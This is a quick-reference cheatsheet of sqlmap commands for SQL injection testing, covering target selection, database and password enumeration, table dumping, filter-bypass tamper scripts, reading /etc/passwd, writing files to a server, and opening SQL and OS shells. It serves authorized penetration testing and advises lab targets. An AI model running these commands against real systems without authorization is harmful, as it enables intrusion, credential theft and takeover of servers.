# Sqlmap Commands Cheatsheet

**sqlmap** is an automated tool for SQL injection and database takeover. This guide covers essential sqlmap commands for users who know the tool but need a quick reference. Always ensure you have permission to test target systems.

## Basic Usage
- **Syntax**:  
  ```bash
  sqlmap [options]
  ```

- **Run sqlmap**:  
  ```bash
  sqlmap -u "<URL>"
  ```

- **Show Help**:  
  ```bash
  sqlmap -h
  ```

- **Show Advanced Help**:  
  ```bash
  sqlmap -hh
  ```

- **Check sqlmap Version**:  
  ```bash
  sqlmap --version
  ```

- **Update sqlmap** (Git installation):  
  ```bash
  sqlmap --update
  ```

## Target Specification
- **Test a URL**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1"
  ```

- **Test Multiple URLs from File**:  
  ```bash
  sqlmap -m urls.txt
  ```

- **Test from HTTP Request File**:  
  ```bash
  sqlmap -r request.txt
  ```

- **Test Specific Parameter**:  
  ```bash
  sqlmap -u "http://example.com/page" -p "id"
  ```

- **Test POST Request**:  
  ```bash
  sqlmap -u "http://example.com/login" --data="username=admin&password=test"
  ```

- **Crawl Website for URLs**:  
  ```bash
  sqlmap -u "http://example.com" --crawl=3
  ```

- **Use Burp Proxy Log**:  
  ```bash
  sqlmap -l burp_logfile.log
  ```

## Enumeration
- **Enumerate Databases**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --dbs
  ```

- **Enumerate Tables in a Database**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" -D <database> --tables
  ```

- **Enumerate Columns in a Table**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" -D <database> -T <table> --columns
  ```

- **Dump Table Data**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" -D <database> -T <table> --dump
  ```

- **Dump Specific Columns**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" -D <database> -T <table> -C col1,col2 --dump
  ```

- **Enumerate Current User**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --current-user
  ```

- **Enumerate Current Database**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --current-db
  ```

- **Enumerate Users**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --users
  ```

- **Enumerate Passwords** (if accessible):  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --passwords
  ```

- **Enumerate All Databases**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --all
  ```

## Injection Techniques
- **Specify Injection Type** (e.g., boolean-based, time-based):  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --technique=B
  ```
  - Options: `B` (boolean), `E` (error), `U` (union), `S` (stacked), `T` (time), `Q` (inline).

- **Force DBMS** (e.g., MySQL, PostgreSQL):  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --dbms=mysql
  ```

- **Custom Injection Payload**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --payload="1' AND 1=1--"
  ```

- **Tamper Scripts** (bypass filters):  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --tamper=space2comment
  ```

- **Test Specific Parameter with Level**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --level=3
  ```
  - Levels: 1 (basic) to 5 (extensive).

- **Test Specific Parameter with Risk**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --risk=3
  ```
  - Risk: 1 (safe) to 3 (aggressive).

## Advanced Options
- **Use Proxy**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"
  ```

- **Set User-Agent**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --user-agent="Mozilla/5.0"
  ```

- **Randomize User-Agent**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --random-agent
  ```

- **Set HTTP Headers**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --headers="Authorization: Bearer <token>"
  ```

- **Use Cookies**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"
  ```

- **Force SSL**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --force-ssl
  ```

- **Delay Between Requests** (seconds):  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --delay=2
  ```

- **Timeout for Requests** (seconds):  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --timeout=10
  ```

- **Verbose Output**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" -v 3
  ```
  - Verbosity: 0 (quiet) to 6 (debug).

- **Batch Mode** (non-interactive, default answers):  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --batch
  ```

- **Save Output to File**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" -o --output-dir=/path/to/output
  ```

## Database Interaction
- **SQL Shell**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --sql-shell
  ```

- **Execute SQL Query**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --sql-query="SELECT * FROM users"
  ```

- **Read File from Server**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd"
  ```

- **Write File to Server**:  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --file-write=/local/file --file-dest=/remote/path
  ```

- **OS Shell** (if permissions allow):  
  ```bash
  sqlmap -u "http://example.com/page?id=1" --os-shell
  ```

## Tips
- Always specify the target URL with `-u` or use a request file with `-r`.
- Use `--batch` for automated scanning without prompts.
- Combine with Burp Suite or proxy logs for complex applications.
- Check tamper scripts in `/usr/share/sqlmap/tamper/` for bypassing WAFs.
- Test on authorized systems only (e.g., DVWA, bWAPP).
- Use `--level` and `--risk` to balance thoroughness and detection risk.